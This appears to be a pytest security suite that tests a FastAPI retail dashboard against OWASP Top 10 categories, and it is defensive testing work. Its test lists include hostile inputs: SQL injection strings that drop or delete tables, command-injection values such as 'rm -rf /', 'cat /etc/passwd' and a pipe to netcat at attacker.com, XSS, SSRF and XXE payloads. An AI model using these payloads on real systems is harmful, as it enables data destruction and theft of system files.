#!/usr/bin/env python3
"""
OWASP Top 10 Security Testing Suite

Comprehensive security testing for Mini Market Dashboard
Covers: Broken Access Control, Injection, Crypto, Auth, etc.
"""

import pytest
import time
import json
from fastapi.testclient import TestClient
from typing import Dict, List
import requests
from datetime import datetime
import hashlib

# ============================================================================
# PYTEST FIXTURES
# ============================================================================

@pytest.fixture
def client():
    """FastAPI test client"""
    from inventario_retail.web_dashboard.dashboard_app import app
    return TestClient(app)

@pytest.fixture
def valid_api_key():
    """Valid API key for testing"""
    return "test_api_key_12345"

@pytest.fixture
def invalid_api_key():
    """Invalid API key"""
    return "invalid_key_xyz"

@pytest.fixture
def test_user():
    """Test user credentials"""
    return {
        "username": "test_user",
        "password": "ValidPass123!@#"
    }

# ============================================================================
# A01:2021 - BROKEN ACCESS CONTROL
# ============================================================================

class TestBrokenAccessControl:
    """Test for Access Control vulnerabilities"""
    
    def test_api_endpoints_require_authentication(self, client):
        """Verify protected endpoints require API key"""
        protected_endpoints = [
            "/api/inventory",
            "/api/metrics",
            "/api/system/config",
            "/api/data/export",
            "/api/users"
        ]
        
        for endpoint in protected_endpoints:
            response = client.get(endpoint)
            assert response.status_code == 401, \
                f"{endpoint} is not protected (got {response.status_code})"
            assert "api" in response.json().get("detail", "").lower() or \
                   "auth" in response.json().get("detail", "").lower()
    
    def test_cors_misconfiguration(self, client):
        """Verify CORS is properly restricted"""
        response = client.options(
            "/api/inventory",
            headers={"Origin": "https://evil.com"}
        )
        
        cors_header = response.headers.get("Access-Control-Allow-Origin")
        
        if cors_header:
            # Si hay CORS, debe estar restringido
            assert cors_header != "*", "CORS is too permissive"
            assert "evil.com" not in cors_header, "CORS allows malicious origins"
    
    def test_horizontal_privilege_escalation(self, client, valid_api_key):
        """Test user cannot access other users' data"""
        # User A intenta acceder a datos de User B
        response = client.get(
            "/api/inventory?user_id=other_user",
            headers={"X-API-Key": valid_api_key}
        )
        
        # Debe ser rechazado o devolver solo datos del usuario actual
        if response.status_code == 200:
            data = response.json()
            assert data.get("user_id") != "other_user", \
                "Horizontal privilege escalation detected"
    
    def test_vertical_privilege_escalation(self, client):
        """Test operator cannot access admin endpoints"""
        operator_key = "operator_api_key"
        admin_endpoints = [
            "/api/system/permissions",
            "/api/encryption/key-rotation",
            "/api/system/users/delete"
        ]
        
        for endpoint in admin_endpoints:
            response = client.post(
                endpoint,
                headers={"X-API-Key": operator_key},
                json={}
            )
            assert response.status_code == 403, \
                f"Operator can access admin endpoint: {endpoint}"
    
    def test_rate_limiting(self, client):
        """Verify rate limiting prevents abuse"""
        endpoint = "/api/auth/login"
        
        failed_attempts = 0
        for i in range(20):
            response = client.post(
                endpoint,
                json={"username": "user", "password": "wrong"}
            )
            
            if response.status_code == 429:  # Too Many Requests
                failed_attempts = i
                break
        
        assert failed_attempts > 0, "Rate limiting not enforced"
        assert failed_attempts <= 10, "Rate limiting threshold too high"

# ============================================================================
# A02:2021 - CRYPTOGRAPHIC FAILURES
# ============================================================================

class TestCryptographicFailures:
    """Test for cryptographic implementation vulnerabilities"""
    
    def test_https_redirect(self, client):
        """Verify HTTP traffic is redirected to HTTPS"""
        response = client.get("/api/inventory", follow_redirects=False)
        
        if response.status_code in [301, 302, 307, 308]:
            assert "https" in response.headers.get("location", "").lower(), \
                "HTTP not redirecting to HTTPS"
    
    def test_tls_version(self):
        """Verify TLS 1.2+ is enforced"""
        import ssl
        
        # Test TLS 1.2 (should work)
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
            # Connection test would happen here
            tls_12_ok = True
        except:
            tls_12_ok = False
        
        assert tls_12_ok, "TLS 1.2 not available"
    
    def test_security_headers(self, client, valid_api_key):
        """Verify security headers are present"""
        response = client.get(
            "/api/inventory",
            headers={"X-API-Key": valid_api_key}
        )
        
        required_headers = {
            "Strict-Transport-Security": "max-age",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1",
        }
        
        for header, expected_value in required_headers.items():
            assert header in response.headers, \
                f"Missing security header: {header}"
            if expected_value:
                assert expected_value in response.headers[header], \
                    f"Header {header} has incorrect value"
    
    def test_encryption_key_storage(self):
        """Verify encryption keys are not hardcoded"""
        import os
        import re
        
        # Check for hardcoded keys in code
        key_patterns = [
            r"ENCRYPTION_KEY\s*=\s*['\"]",
            r"SECRET_KEY\s*=\s*['\"]",
            r"API_KEY\s*=\s*['\"]",
        ]
        
        files_to_check = [
            "inventario-retail/web_dashboard/dashboard_app.py",
            "inventario-retail/web_dashboard/config.py",
        ]
        
        for filepath in files_to_check:
            try:
                with open(filepath, 'r') as f:
                    content = f.read()
                    for pattern in key_patterns:
                        matches = re.findall(pattern, content)
                        assert len(matches) == 0, \
                            f"Potential hardcoded key found in {filepath}"
            except FileNotFoundError:
                pass  # File might not exist in test environment

# ============================================================================
# A03:2021 - INJECTION
# ============================================================================

class TestInjection:
    """Test for injection vulnerabilities"""
    
    def test_sql_injection_via_search(self, client, valid_api_key):
        """Test SQL injection protection in search"""
        sql_payloads = [
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "1; DROP TABLE inventory;--",
            "' UNION SELECT * FROM users--",
        ]
        
        for payload in sql_payloads:
            response = client.get(
                "/api/inventory",
                params={"search": payload},
                headers={"X-API-Key": valid_api_key}
            )
            
            # Must not succeed with injection
            assert response.status_code in [400, 422, 403], \
                f"SQL injection payload accepted: {payload}"
    
    def test_sql_injection_via_id(self, client, valid_api_key):
        """Test SQL injection via ID parameter"""
        response = client.get(
            "/api/inventory/1; DELETE FROM inventory;--",
            headers={"X-API-Key": valid_api_key}
        )
        
        assert response.status_code in [400, 404, 422], \
            "SQL injection in ID parameter not prevented"
    
    def test_command_injection(self, client, valid_api_key):
        """Test command injection protection"""
        command_payloads = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
        ]
        
        for payload in command_payloads:
            response = client.post(
                "/api/export",
                params={"format": payload},
                headers={"X-API-Key": valid_api_key}
            )
            
            assert response.status_code in [400, 422], \
                f"Command injection not prevented: {payload}"
    
    def test_xss_protection(self, client, valid_api_key):
        """Test XSS input sanitization"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror='alert(1)'>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
        ]
        
        for payload in xss_payloads:
            response = client.post(
                "/api/inventory/comment",
                json={"comment": payload},
                headers={"X-API-Key": valid_api_key}
            )
            
            if response.status_code == 200:
                # If accepted, must be escaped
                data = response.json()
                stored_value = json.dumps(data)
                assert "<script>" not in stored_value, \
                    f"XSS payload stored unescaped: {payload}"

# ============================================================================
# A04:2021 - INSECURE DESIGN
# ============================================================================

class TestInsecureDesign:
    """Test for insecure design vulnerabilities"""
    
    def test_resource_limits_pagination(self, client, valid_api_key):
        """Verify pagination limits prevent DoS"""
        response = client.get(
            "/api/inventory?limit=1000000",
            headers={"X-API-Key": valid_api_key}
        )
        
        # Should either cap the limit or reject
        assert response.status_code in [200, 400, 422]
        if response.status_code == 200:
            data = response.json()
            if isinstance(data, list):
                assert len(data) <= 1000, \
                    "Returned too many records (DoS risk)"
    
    def test_account_lockout(self, client):
        """Test account lockout after failed attempts"""
        username = "testuser"
        
        for i in range(10):
            response = client.post(
                "/api/auth/login",
                json={"username": username, "password": "wrongpass"}
            )
            
            if response.status_code == 429:
                # Rate limited before account lockout
                break
            elif response.status_code == 403:
                # Account locked
                assert "locked" in response.json().get("detail", "").lower()
                break
    
    def test_password_policy(self, client):
        """Test password policy enforcement"""
        weak_passwords = [
            "123",
            "password",
            "abc123",
            "abcdefgh",
        ]
        
        for weak_pass in weak_passwords:
            response = client.post(
                "/api/auth/register",
                json={
                    "username": "newuser",
                    "password": weak_pass
                }
            )
            
            assert response.status_code in [400, 422], \
                f"Weak password accepted: {weak_pass}"

# ============================================================================
# A05:2021 - BROKEN AUTHENTICATION
# ============================================================================

class TestBrokenAuthentication:
    """Test for authentication vulnerabilities"""
    
    def test_password_hashing(self, client, valid_api_key):
        """Verify passwords are properly hashed"""
        import os
        import json
        
        # Read database connection and verify hash storage
        db_url = os.getenv("DATABASE_URL", "")
        
        if db_url:
            # Would connect to DB and verify password hashes
            # Check that passwords are never in plaintext
            pass  # Require DB access
    
    def test_session_timeout(self, client):
        """Test session expiration"""
        # Login
        response = client.post(
            "/api/auth/login",
            json={"username": "user", "password": "ValidPass123!"}
        )
        
        if response.status_code == 200:
            # Try to use session after timeout
            time.sleep(2)  # Wait for timeout
            
            response2 = client.get(
                "/api/inventory",
                headers={"X-API-Key": response.json().get("token")}
            )
            
            # After timeout, should require re-auth
            assert response2.status_code in [401, 403]
    
    def test_cookie_security(self, client):
        """Verify secure cookie flags"""
        response = client.post(
            "/api/auth/login",
            json={"username": "user", "password": "ValidPass123!"}
        )
        
        if "Set-Cookie" in response.headers:
            cookie = response.headers["Set-Cookie"]
            assert "Secure" in cookie, "Cookie not marked Secure"
            assert "HttpOnly" in cookie, "Cookie not marked HttpOnly"
            assert "SameSite" in cookie, "Cookie missing SameSite"

# ============================================================================
# A06:2021 - VULNERABLE & OUTDATED COMPONENTS
# ============================================================================

class TestVulnerableComponents:
    """Test for outdated/vulnerable dependencies"""
    
    def test_python_version(self):
        """Verify Python 3.8+"""
        import sys
        assert sys.version_info >= (3, 8), \
            f"Python version {sys.version} is too old"
    
    def test_dependencies_secure(self):
        """Check for known vulnerabilities"""
        try:
            import subprocess
            result = subprocess.run(
                ["pip", "install", "pip-audit"],
                capture_output=True,
                timeout=10
            )
            # In CI/CD, this should run: pip-audit
        except:
            pass  # Skip if pip-audit not available

# ============================================================================
# A10:2021 - SERVER-SIDE REQUEST FORGERY (SSRF)
# ============================================================================

class TestSSRF:
    """Test for SSRF vulnerabilities"""
    
    def test_webhook_url_validation(self, client, valid_api_key):
        """Test SSRF protection in webhooks"""
        malicious_urls = [
            "http://127.0.0.1:5432/",
            "http://localhost:8000/admin",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "file:///etc/passwd",
            "http://internal-service:9000/",
        ]
        
        for url in malicious_urls:
            response = client.post(
                "/api/webhooks/register",
                json={"webhook_url": url},
                headers={"X-API-Key": valid_api_key}
            )
            
            # Should be rejected
            assert response.status_code in [400, 403], \
                f"SSRF URL accepted: {url}"
    
    def test_xxe_protection(self, client, valid_api_key):
        """Test XXE vulnerability protection"""
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
        
        response = client.post(
            "/api/upload/xml",
            data=xxe_payload,
            headers={
                "X-API-Key": valid_api_key,
                "Content-Type": "application/xml"
            }
        )
        
        # Must reject or not process XXE
        if response.status_code == 200:
            assert "/etc/passwd" not in response.text, \
                "XXE vulnerability detected"

# ============================================================================
# TEST EXECUTION & REPORTING
# ============================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
